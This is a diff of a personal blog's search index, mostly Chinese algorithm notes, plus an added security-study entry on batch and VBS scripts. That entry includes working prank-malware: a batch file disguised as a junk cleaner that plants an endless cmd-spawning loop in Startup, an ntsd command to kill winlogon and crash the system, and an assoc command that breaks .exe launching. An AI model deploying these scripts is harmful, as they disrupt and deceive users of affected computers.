@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Brian Kernighan Algorithm</title>
+    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
+    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
+<ol>
+<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
+<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
+</li>
+<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
+<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
+</li>
+</ol>
+<p>可以测试一下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
+<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
+]]></content>
+      <categories>
+        <category>Code_Algo</category>
+      </categories>
+      <tags>
+        <tag>Math,Binary</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>凸包算法</title>
     <url>/2022/05/25/Algorithm/%E5%87%B8%E5%8C%85%E7%AE%97%E6%B3%95/</url>
     <content><![CDATA[<h2 id="凸包算法"><a href="#凸包算法" class="headerlink" title="凸包算法"></a>凸包算法</h2><p># 待补充：Jarvis，Andrew </p>
@@ -75,29 +98,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Brian Kernighan Algorithm</title>
-    <url>/2022/05/25/Algorithm/Brian-Kernighan-Algorithm/</url>
-    <content><![CDATA[<h1 id="Brian-Kernighan-Algorithm"><a href="#Brian-Kernighan-Algorithm" class="headerlink" title="Brian Kernighan Algorithm"></a>Brian Kernighan Algorithm</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>通过一定的位运算取到二进制数据的相应位</p>
-<ol>
-<li><p>$n\&amp;(n-1)$ 将数据二进制最右的 1 变为 0 </p>
-<p>例如：$n = 11_{(10)} = 1011_{(2)}, n\&amp;(n-1) = 1011 \&amp; 1010 = 1010_{(2)} = 10_{(10)}$</p>
-</li>
-<li><p>$n\&amp;(~n+1)$ 提取数据二进制最后一个 1 到结尾的数据</p>
-<p>例如：$n = 14_{(10)} = 1110_{(2)}, n\&amp;(~n+1) = 1110 \&amp; 0001 + 00001 = 1110 \&amp; 0010 = 0010_{(2)} = 2_{(10)}$</p>
-</li>
-</ol>
-<p>可以测试一下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = random.randint(<span class="number">0</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(n,<span class="built_in">bin</span>(n))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(n−1):&#x27;</span>,n&amp;(n-<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(n-<span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n&amp;(~n+1):&#x27;</span>,n&amp;(~n+<span class="number">1</span>),<span class="built_in">bin</span>(n&amp;(~n+<span class="number">1</span>)))</span><br></pre></td></tr></table></figure>
-<h2 id="example："><a href="#example：" class="headerlink" title="example："></a>example：</h2><p><a href="https://leetcode.cn/problems/number-of-1-bits/">191. 位1的个数</a></p>
-]]></content>
-      <categories>
-        <category>Code_Algo</category>
-      </categories>
-      <tags>
-        <tag>Math,Binary</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>矩阵快速幂</title>
     <url>/2022/05/25/Algorithm/%E7%9F%A9%E9%98%B5%E5%BF%AB%E9%80%9F%E5%B9%82/</url>
     <content><![CDATA[<h1 id="矩阵快速幂"><a href="#矩阵快速幂" class="headerlink" title="矩阵快速幂"></a><strong>矩阵快速幂</strong></h1><h2 id="整数快速幂"><a href="#整数快速幂" class="headerlink" title="整数快速幂"></a>整数快速幂</h2><p>解释：计算模幂运算时，可用的规则有：</p>
@@ -158,11 +158,29 @@ M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure cl
       </tags>
   </entry>
   <entry>
-    <title>约瑟夫环</title>
-    <url>/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/</url>
-    <content><![CDATA[<h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>参见：</p>
-<p> <a href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></p>
-<h4 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h4>]]></content>
+    <title>蓄水池算法</title>
+    <url>/2022/05/25/Algorithm/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</url>
+    <content><![CDATA[<h1 id="蓄水池算法"><a href="#蓄水池算法" class="headerlink" title="蓄水池算法"></a>蓄水池算法</h1><p><a href="https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1</a></p>
+<p>假设有一个蓄水池，蓄水池里不断加水，问如何在每一时刻都能以相同概率采样到数据？当然还可能有很多别的理解方式，但都要求在数据量变化的情况下使得抽样的概率相等。</p>
+<p>具体例子：<a href="https://leetcode-cn.com/problems/random-pick-index/">398. 随机数索引</a></p>
+<p>当然，存在很多现有的函数能够实现随机采样，但归其根源，考虑用概率解决：</p>
+<h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>假设数据序列的规模为 $n$，需要采样的数量的为 $k$。</p>
+<p>首先构建一个可容纳 $k$ 个元素的数组，将序列的前 $k$ 个元素放入数组中。</p>
+<p>然后从第 $k+1$ 个元素开始，以 $k_n$ 的概率来决定该元素是否被替换到数组中（数组中的元素被替换的概率是相同的）。 当遍历完所有元素之后，数组中剩下的元素即为所需采取的样本。</p>
+<h2 id="证明过程"><a href="#证明过程" class="headerlink" title="证明过程"></a>证明过程</h2><p>也可以抽取的样本是 $1$，概率就变成 $\frac{1}{n}$ ，如下：</p>
+<p>当只有一个数据时，采样到的概率为 $1$ ；</p>
+<p>加入一个数据时，取到它的概率为 $\frac{1}{2}$，那么，取到第一个数据的概率也为  $\frac{1}{2}$；</p>
+<p>再加入一个数据，取到它的概率为 $\frac{1}{3}$，取到前两个数据的概率就应该发生变化，为 之前的概率*本次未被选中的概率，即$\frac{1}{2}\times(1-\frac{1}{3})=\frac{1}{3}$；</p>
+<p>以此类推…</p>
+<p>对于抽样 $k$ 个数据集：</p>
+<p>对于第 $i$ 个数$（i≤ki≤k）$。在 $k$ 步之前，被选中的概率为 $1$。当走到第 $k+1$ 步时，被第 $k+1$ 个元素构成的新集合替换的概率 = $k+1$ 个元素中选中前 $k$ 个的概率 <em> 前 $k$ 个中选一个替换的概率，即为 $\frac{k}{k+1}</em>\frac{1}{k}=\frac{1}{k+1}$。则被保留的概率为 $1-\frac{1}{k+1}=\frac{k}{k+1}$。以此类推，则运行到第 $n$ 步时，被保留的概率 = 被选中的概率 * 不被替换的概率，即：</p>
+<script type="math/tex; mode=display">
+1\times\frac{k}{k+1}\times\frac{k+1}{k+2}\times...\times\frac{n-1}{n}=\frac{k}{n}\\
+or\\
+\frac{n-1}{n}\times\frac{n-2}{n-1}\times...\times\frac{k}{k+1}\times1=\frac{k}{n}</script><p>这是符合要求的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = 0</span><br><span class="line">s = NULL</span><br><span class="line">for line in lines:</span><br><span class="line">	i = i + 1</span><br><span class="line">	r = random.choice(0,1)</span><br><span class="line">	if r &lt; 1/i:</span><br><span class="line">		s = line #替换</span><br></pre></td></tr></table></figure>
+<h2 id="关于为什么替换"><a href="#关于为什么替换" class="headerlink" title="关于为什么替换"></a>关于为什么替换</h2><p>替换就是采样，不断地替换或者不替换表示当前是否采样到该数据；</p>
+]]></content>
       <categories>
         <category>Code_Algo</category>
       </categories>
@@ -196,29 +214,11 @@ M = \left[ \begin{matrix} 1 & 1 \\ 1 & 0 \end{matrix} \right]</script><figure cl
       </tags>
   </entry>
   <entry>
-    <title>蓄水池算法</title>
-    <url>/2022/05/25/Algorithm/%E8%93%84%E6%B0%B4%E6%B1%A0%E7%AE%97%E6%B3%95/</url>
-    <content><![CDATA[<h1 id="蓄水池算法"><a href="#蓄水池算法" class="headerlink" title="蓄水池算法"></a>蓄水池算法</h1><p><a href="https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1">https://www.bilibili.com/video/BV17i4y1j7wE/?spm_id_from=333.788.recommend_more_video.1</a></p>
-<p>假设有一个蓄水池，蓄水池里不断加水，问如何在每一时刻都能以相同概率采样到数据？当然还可能有很多别的理解方式，但都要求在数据量变化的情况下使得抽样的概率相等。</p>
-<p>具体例子：<a href="https://leetcode-cn.com/problems/random-pick-index/">398. 随机数索引</a></p>
-<p>当然，存在很多现有的函数能够实现随机采样，但归其根源，考虑用概率解决：</p>
-<h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>假设数据序列的规模为 $n$，需要采样的数量的为 $k$。</p>
-<p>首先构建一个可容纳 $k$ 个元素的数组，将序列的前 $k$ 个元素放入数组中。</p>
-<p>然后从第 $k+1$ 个元素开始，以 $k_n$ 的概率来决定该元素是否被替换到数组中（数组中的元素被替换的概率是相同的）。 当遍历完所有元素之后，数组中剩下的元素即为所需采取的样本。</p>
-<h2 id="证明过程"><a href="#证明过程" class="headerlink" title="证明过程"></a>证明过程</h2><p>也可以抽取的样本是 $1$，概率就变成 $\frac{1}{n}$ ，如下：</p>
-<p>当只有一个数据时，采样到的概率为 $1$ ；</p>
-<p>加入一个数据时，取到它的概率为 $\frac{1}{2}$，那么，取到第一个数据的概率也为  $\frac{1}{2}$；</p>
-<p>再加入一个数据，取到它的概率为 $\frac{1}{3}$，取到前两个数据的概率就应该发生变化，为 之前的概率*本次未被选中的概率，即$\frac{1}{2}\times(1-\frac{1}{3})=\frac{1}{3}$；</p>
-<p>以此类推…</p>
-<p>对于抽样 $k$ 个数据集：</p>
-<p>对于第 $i$ 个数$（i≤ki≤k）$。在 $k$ 步之前，被选中的概率为 $1$。当走到第 $k+1$ 步时，被第 $k+1$ 个元素构成的新集合替换的概率 = $k+1$ 个元素中选中前 $k$ 个的概率 <em> 前 $k$ 个中选一个替换的概率，即为 $\frac{k}{k+1}</em>\frac{1}{k}=\frac{1}{k+1}$。则被保留的概率为 $1-\frac{1}{k+1}=\frac{k}{k+1}$。以此类推，则运行到第 $n$ 步时，被保留的概率 = 被选中的概率 * 不被替换的概率，即：</p>
-<script type="math/tex; mode=display">
-1\times\frac{k}{k+1}\times\frac{k+1}{k+2}\times...\times\frac{n-1}{n}=\frac{k}{n}\\
-or\\
-\frac{n-1}{n}\times\frac{n-2}{n-1}\times...\times\frac{k}{k+1}\times1=\frac{k}{n}</script><p>这是符合要求的。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i = 0</span><br><span class="line">s = NULL</span><br><span class="line">for line in lines:</span><br><span class="line">	i = i + 1</span><br><span class="line">	r = random.choice(0,1)</span><br><span class="line">	if r &lt; 1/i:</span><br><span class="line">		s = line #替换</span><br></pre></td></tr></table></figure>
-<h2 id="关于为什么替换"><a href="#关于为什么替换" class="headerlink" title="关于为什么替换"></a>关于为什么替换</h2><p>替换就是采样，不断地替换或者不替换表示当前是否采样到该数据；</p>
-]]></content>
+    <title>约瑟夫环</title>
+    <url>/2022/05/25/Algorithm/%E7%BA%A6%E7%91%9F%E5%A4%AB%E7%8E%AF/</url>
+    <content><![CDATA[<h1 id="约瑟夫环"><a href="#约瑟夫环" class="headerlink" title="约瑟夫环"></a>约瑟夫环</h1><p>参见：</p>
+<p> <a href="https://leetcode-cn.com/problems/find-the-winner-of-the-circular-game/">1823. 找出游戏的获胜者</a></p>
+<h4 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h4>]]></content>
       <categories>
         <category>Code_Algo</category>
       </categories>
@@ -337,6 +337,62 @@ or\\
 <p>move 原地址 新地址           移动</p>
 <p>copy 原地址 目的地址         复制粘贴</p>
 </blockquote>
+]]></content>
+      <categories>
+        <category>CS</category>
+      </categories>
+      <tags>
+        <tag>CS_OP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安学习-D-3-批处理，脚本，过时小病毒</title>
+    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/</url>
+    <content><![CDATA[<p>环境：win2003 虚拟机</p>
+<p>只做简单了解，并不深究…</p>
+<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
+<p>使用的是 <a href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
+<p><strong>发布博客的批处理文件</strong></p>
+<p>我自己的：</p>
+<ol>
+<li>push</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+<ol>
+<li>check</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
+<p><strong>一个小例子</strong></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
+<p>如：</p>
+<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
+<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
+<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
+<p>参考：</p>
+<p><a href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
+<p><a href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
+<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
+<ol>
+<li><p>添加 开机自启动项，无限弹窗</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<ol>
+<li><p>杀死不能杀死的进程，导致蓝屏 （win2003）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
+<p>ntsd    ：杀死进程</p>
+<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
+<p>winlogon.exe    ：<a href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
+</li>
+</ol>
+</li>
+</ol>
+<ol>
+<li><p>修改文件关联，使无法打开（前一章写过）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>CS</category>
@@ -466,69 +522,6 @@ D_n = \max (N,\lceil(R \cdot \ell-N \cdot s) / n\rceil)</script>]]></content>
       <categories>
         <category>Cryptanalysis</category>
       </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LC 5.23 t.675 Cut Off Trees for Golf Event</title>
-    <url>/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/</url>
-    <content><![CDATA[<h4 id="5-23-675-为高尔夫比赛砍树"><a href="#5-23-675-为高尔夫比赛砍树" class="headerlink" title="5.23  675. 为高尔夫比赛砍树"></a>5.23  <a href="https://leetcode.cn/problems/cut-off-trees-for-golf-event/">675. 为高尔夫比赛砍树</a></h4><p>难度：困难</p>
-<p>你被请来给一个要举办高尔夫比赛的树林砍树。树林由一个 <code>m x n</code> 的矩阵表示， 在这个矩阵中：</p>
-<ul>
-<li><code>0</code> 表示障碍，无法触碰</li>
-<li><code>1</code> 表示地面，可以行走</li>
-<li><code>比 1 大的数</code> 表示有树的单元格，可以行走，数值表示树的高度</li>
-</ul>
-<p>每一步，你都可以向上、下、左、右四个方向之一移动一个单位，如果你站的地方有一棵树，那么你可以决定是否要砍倒它。</p>
-<p>你需要按照树的高度从低向高砍掉所有的树，每砍过一颗树，该单元格的值变为 <code>1</code>（即变为地面）。</p>
-<p>你将从 <code>(0, 0)</code> 点开始工作，返回你砍完所有树需要走的最小步数。 如果你无法砍完所有的树，返回 <code>-1</code> 。</p>
-<p>可以保证的是，没有两棵树的高度是相同的，并且你至少需要砍倒一棵树。</p>
-<p><strong>示例 1：</strong></p>
-<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees1.jpg" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,4],[7,6,5]]</span><br><span class="line">输出：6</span><br><span class="line">解释：沿着上面的路径，你可以用 6 步，按从最矮到最高的顺序砍掉这些树。</span><br></pre></td></tr></table></figure>
-<p><strong>示例 2：</strong></p>
-<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees2.jpg" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,0],[7,6,5]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：由于中间一行被障碍阻塞，无法访问最下面一行中的树。</span><br></pre></td></tr></table></figure>
-<p><strong>示例 3：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：forest = [[2,3,4],[0,0,5],[8,7,6]]</span><br><span class="line">输出：6</span><br><span class="line">解释：可以按与示例 1 相同的路径来砍掉所有的树。</span><br><span class="line">(0,0) 位置的树，可以直接砍去，不用算步数。</span><br></pre></td></tr></table></figure>
-<p><strong>提示：</strong></p>
-<ul>
-<li><code>m == forest.length</code></li>
-<li><code>n == forest[i].length</code></li>
-<li><code>1 &lt;= m, n &lt;= 50</code></li>
-<li><code>0 &lt;= forest[i][j] &lt;= 109</code></li>
-</ul>
-<h5 id="思路1：排序＋广搜"><a href="#思路1：排序＋广搜" class="headerlink" title="思路1：排序＋广搜"></a>思路1：排序＋广搜</h5><blockquote>
-<p>类似 <a href="https://leetcode.cn/problems/pacific-atlantic-water-flow/">417. 太平洋大西洋水流问题</a> 都是四个方向的广搜，但限制条件不同</p>
-<p>先将需要砍掉的树按照树高度排序，需要记录坐标和高度 <code>(index_x,index_y,height)</code>，然后使用广度优先从四个方向搜索，搜索之前建立<code>visit[]</code>数组记录是否搜索过，可以先建立方向列表或直接遍历，原理是 <code>((x+1,y),(x-1,y),(x,y+1),(x,y-1))</code> 将满足限制条件的点再次入队。</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutOffTree</span>(<span class="params">self, forest: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#广度优先搜素</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">sx,sy,tx,ty</span>):</span><br><span class="line">            row = <span class="built_in">len</span>(forest)</span><br><span class="line">            col = <span class="built_in">len</span>(forest[<span class="number">0</span>])</span><br><span class="line">            queue = deque([(<span class="number">0</span>,sx,sy)])</span><br><span class="line">            visit = &#123;(sx,sy)&#125;</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                distance,x,y = queue.popleft()</span><br><span class="line">                <span class="keyword">if</span> x == tx <span class="keyword">and</span> y == ty:</span><br><span class="line">                    <span class="keyword">return</span> distance</span><br><span class="line">                <span class="keyword">for</span> nx,ny <span class="keyword">in</span> ((x+<span class="number">1</span>,y),(x-<span class="number">1</span>,y),(x,y+<span class="number">1</span>),(x,y-<span class="number">1</span>)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span>&lt;=nx&lt;row <span class="keyword">and</span> <span class="number">0</span>&lt;=ny&lt;col <span class="keyword">and</span> forest[nx][ny] <span class="keyword">and</span> (nx,ny) <span class="keyword">not</span> <span class="keyword">in</span> visit:</span><br><span class="line">                        visit.add((nx,ny))</span><br><span class="line">                        queue.append((distance+<span class="number">1</span>,nx,ny))</span><br><span class="line">                    <span class="comment">#print(&quot;queue:&quot;,queue)</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按照树的高度排序(indx_x,indx_y,height)</span></span><br><span class="line">        sort_trees = []</span><br><span class="line">        <span class="keyword">for</span> row,tree <span class="keyword">in</span> <span class="built_in">enumerate</span>(forest):</span><br><span class="line">            <span class="keyword">for</span> col,h <span class="keyword">in</span> <span class="built_in">enumerate</span>(tree):</span><br><span class="line">                <span class="keyword">if</span> h &gt; <span class="number">1</span>:</span><br><span class="line">                    sort_trees.append((row,col,h))</span><br><span class="line">        sort_trees = <span class="built_in">sorted</span>(sort_trees,key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(sort_trees)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        res = pre_x = pre_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y,h <span class="keyword">in</span> sort_trees:</span><br><span class="line">            d = bfs(pre_x,pre_y,x,y)</span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            res += d</span><br><span class="line">            pre_x,pre_y = x,y</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
-<h5 id="矩阵类-BFS-的-demo"><a href="#矩阵类-BFS-的-demo" class="headerlink" title="矩阵类 BFS 的 demo"></a>矩阵类 BFS 的 demo</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">sorce_val,target_val</span>):</span><br><span class="line">    row = <span class="built_in">len</span>(Matrix)</span><br><span class="line">    col = <span class="built_in">len</span>(Matrix[<span class="number">0</span>])</span><br><span class="line">    queue = deque([(need_val,indexs)])</span><br><span class="line">    visit = &#123;(pointer_index)&#125;</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        <span class="comment">#Limit the values stored in the queue based on conditions</span></span><br><span class="line">        need_val,indexs = queue.popleft()	</span><br><span 